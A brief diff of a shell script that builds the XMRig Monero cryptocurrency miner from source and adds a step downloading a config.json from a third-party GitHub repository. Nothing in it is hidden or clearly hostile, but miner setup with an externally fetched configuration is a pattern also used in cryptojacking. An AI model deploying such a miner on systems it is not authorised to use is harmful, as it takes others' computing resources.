@@ -3,8 +3,8 @@ sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc
 
 git clone https://github.com/xmrig/xmrig.git 
 
-cd xmrig && mkdir build && cd build
+cd xmrig && mkdir build && cd build \
 
-cmake ..
+cmake .. && make
 
-make
+wget https://raw.githubusercontent.com/basetrue/home/master/config.json
